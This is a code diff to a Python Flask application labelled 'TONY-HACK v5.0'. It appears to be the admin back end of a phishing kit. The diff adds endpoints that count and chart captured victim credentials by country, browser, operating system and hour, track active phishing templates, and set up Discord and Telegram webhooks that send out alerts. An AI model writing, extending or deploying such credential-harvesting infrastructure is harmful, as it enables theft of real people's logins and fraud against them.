@@ -19,7 +19,7 @@ import requests
 import re
 import time
 
-# PostgreSQL - Version compatible Python 3.14
+# PostgreSQL
 import psycopg2
 from psycopg2.extras import RealDictCursor
 
@@ -509,3 +509,115 @@ def api_statistics_advanced():
                 os_data[os_name] = os_data.get(os_name, 0) + 1
             
             ts = c.get('timestamp')
+            if ts:
+                try:
+                    hourly[str(ts.hour).zfill(2)] += 1
+                except:
+                    pass
+        
+        sorted_countries = sorted(countries.items(), key=lambda x: x[1], reverse=True)[:10]
+        
+        return jsonify({
+            'countries': [{'name': c[0], 'count': c[1]} for c in sorted_countries],
+            'browsers': [{'name': b, 'count': c} for b, c in browsers.items()],
+            'os': [{'name': o, 'count': c} for o, c in os_data.items()],
+            'hourly': {'labels': [f"{h}h" for h in range(24)], 'data': [hourly[str(h).zfill(2)] for h in range(24)]},
+            'total': len(creds)
+        })
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+# =====================================================
+# API STATS GLOBALES
+# =====================================================
+
+@app.route('/api/stats')
+def api_stats():
+    try:
+        with get_db() as conn:
+            with conn.cursor() as cur:
+                cur.execute("SELECT COUNT(*) as templates FROM templates WHERE active = TRUE")
+                templates = cur.fetchone()['templates']
+                cur.execute("SELECT COUNT(*) as credentials FROM credentials")
+                creds = cur.fetchone()['credentials']
+        return jsonify({'templates': templates, 'credentials': creds})
+    except: return jsonify({'templates': 0, 'credentials': 0})
+
+# =====================================================
+# API PROFILE
+# =====================================================
+
+@app.route('/api/profile')
+def api_profile():
+    if 'user' not in session: return jsonify({'error': 'Non authentifié'}), 401
+    return jsonify({'username': session.get('user'), 'role': 'Super Admin'})
+
+# =====================================================
+# API WEBHOOKS
+# =====================================================
+
+@app.route('/api/webhooks', methods=['GET'])
+def api_get_webhooks():
+    if 'user' not in session: return jsonify({'error': 'Non authentifié'}), 401
+    return jsonify(webhook_manager.get_all())
+
+@app.route('/api/webhooks/discord', methods=['POST'])
+def api_add_discord():
+    if 'user' not in session: return jsonify({'error': 'Non authentifié'}), 401
+    d = request.get_json() or {}
+    if d.get('url'): webhook_manager.add_discord(d['url'], d.get('name', 'Discord')); return jsonify({'success': True})
+    return jsonify({'error': 'URL requise'}), 400
+
+@app.route('/api/webhooks/telegram', methods=['POST'])
+def api_add_telegram():
+    if 'user' not in session: return jsonify({'error': 'Non authentifié'}), 401
+    d = request.get_json() or {}
+    if d.get('token') and d.get('chat_id'): webhook_manager.add_telegram(d['token'], d['chat_id'], d.get('name', 'Telegram')); return jsonify({'success': True})
+    return jsonify({'error': 'Token sy Chat ID ilaina'}), 400
+
+@app.route('/api/webhooks/<service>/<int:id>', methods=['DELETE'])
+def api_remove_webhook(service, id):
+    if 'user' not in session: return jsonify({'error': 'Non authentifié'}), 401
+    webhook_manager.remove(service, id)
+    return jsonify({'success': True})
+
+@app.route('/api/webhooks/<service>/<int:id>/toggle', methods=['POST'])
+def api_toggle_webhook(service, id):
+    if 'user' not in session: return jsonify({'error': 'Non authentifié'}), 401
+    webhook_manager.toggle(service, id)
+    return jsonify({'success': True})
+
+@app.route('/api/webhooks/test', methods=['POST'])
+def api_test_webhook():
+    if 'user' not in session: return jsonify({'error': 'Non authentifié'}), 401
+    d = request.get_json() or {}; s = d.get('service')
+    if s == 'discord': ok = webhook_manager.send_discord(d.get('url'), "🧪 Test", "✅ Webhook Discord mandeha!")
+    elif s == 'telegram': ok = webhook_manager.send_telegram(d.get('token'), d.get('chat_id'), "🧪 <b>Test</b>\n\n✅ Webhook Telegram mandeha!")
+    else: return jsonify({'error': 'Service invalide'}), 400
+    return jsonify({'success': ok})
+
+# =====================================================
+# API SETTINGS
+# =====================================================
+
+@app.route('/api/settings', methods=['POST'])
+def save_settings():
+    if 'user' not in session: return jsonify({'error': 'Non authentifié'}), 401
+    d = request.get_json() or {}
+    try:
+        with get_db() as conn:
+            with conn.cursor() as cur:
+                for k, v in d.items():
+                    cur.execute("INSERT INTO settings (key, value) VALUES (%s, %s) ON CONFLICT (key) DO UPDATE SET value = %s", (k, v, v))
+                conn.commit()
+    except: pass
+    return jsonify({'success': True})
+
+# =====================================================
+# DÉMARRAGE
+# =====================================================
+
+if __name__ == '__main__':
+    port = int(os.environ.get('PORT', 5000))
+    print(f"\n🔴 TONY-HACK v5.0 - RENDER READY")
+    app.run(host='0.0.0.0', port=port, debug=False)
